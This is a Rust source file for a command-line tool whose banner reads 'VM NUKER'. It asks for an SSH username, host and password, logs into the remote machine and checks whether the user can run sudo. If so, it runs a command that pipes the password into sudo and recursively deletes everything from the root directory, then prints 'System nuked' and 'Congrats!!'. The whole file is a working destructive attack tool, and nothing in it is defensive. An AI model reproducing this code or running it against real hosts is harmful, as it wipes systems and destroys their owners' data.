use std::process::Command;
use std::net::TcpStream;
use dialoguer::Input;
use std::io::Read;
use ssh2::Session;

fn fire(text: &str) -> String {
    let _ = Command::new("clear").status();

    let mut faded = String::new();
    let mut green = 250;

    for line in text.lines() {
        faded.push_str(&format!("\x1b[38;2;255;{};0m{}\x1b[0m\n", green, line));
        if green > 0 {
            green -= 25;
        }
    }
    faded
}
fn nuke(user: &str, host: &str, passwd: &str) {
    let tcp = TcpStream::connect(format!("{}:22", host)).unwrap();
    let mut sess = Session::new().unwrap();

    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    sess.userauth_password(&user, &passwd).unwrap();

    let mut channel = sess.channel_session().unwrap();

    println!("\x1b[33m( ! )\x1b[0m Nuking the system...");
    channel.exec(&format!("echo '{}' | sudo -S sh -c 'cd ../.. && rm -rf *'",passwd)).unwrap();
    println!("\x1b[32m( + )\x1b[0m System nuked");
    println!("\n\x1b[32m( + )\x1b[0m Congrats!!\n");
    channel.close().unwrap();

}

fn main() {
    let message = r#"


      ██▒   █▓ ███▄ ▄███▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
     ▓██░   █▒▓██▒▀█▀ ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
      ▓██  █▒░▓██    ▓██░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
       ▒██ █░░▒██    ▒██    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
        ▒▀█░  ▒██▒   ░██▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
        ░ ▐░  ░ ▒░   ░  ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░░  ░  ░      ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
          ░░  ░      ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
           ░         ░               ░    ░     ░  ░      ░  ░   ░     
          ░                                  
                                       ＢＹ ＭＡＴＩＸＡＮＤＲ０９                     
"#;

    let fire_text = fire(message);
    println!("{}", fire_text);

    let user: String = Input::new()
        .with_prompt("\x1b[35m( ? )\x1b[0m Enter your username")
        .interact_text()
        .expect("\x1b[31m( X )\x1b[0m Error reading username");

    let host: String = Input::new()
        .with_prompt("\x1b[35m( ? )\x1b[0m Enter host")
        .interact_text()
        .expect("\x1b[31m( X )\x1b[0m Error reading host");

    let passwd: String = Input::new()
        .with_prompt("\x1b[35m( ? )\x1b[0m Enter password to SSH")
        .interact_text()
        .expect("\x1b[31m( X )\x1b[0m Error reading passwd");

    println!("\n\n\x1b[32m( + )\x1b[0m Connecting to: {}@{} ...", user, host);
    let tcp = std::net::TcpStream::connect(format!("{}:22", host)).unwrap();
    let mut sess = Session::new().unwrap();
    println!("\x1b[32m( + )\x1b[0m Session created");
    sess.set_tcp_stream(tcp);
    sess.handshake().unwrap();
    sess.userauth_password(&user, &passwd).unwrap();
    println!("\x1b[32m( + )\x1b[0m Authenticated with password");
    let mut channel = sess.channel_session().unwrap();

    println!("\x1b[32m( + )\x1b[0m Checking sudo permissions...");
    channel.exec("sudo -vn").unwrap();
    let mut s = String::new();
    channel.read_to_string(&mut s).unwrap();

    if s.contains("may not run sudo") {
        println!("\x1b[31m( X )\x1b[0m User does not have sudo permission");
    } else if s.contains("a password is required") {
        println!("\x1b[33m( ! )\x1b[0m User has sudo permission but a password is required");
        nuke(&user, &host, &passwd);
    } else {
        println!("\x1b[33m( ! )\x1b[0m User has sudo permission without password");
        nuke(&user, &host, &passwd);
    }
}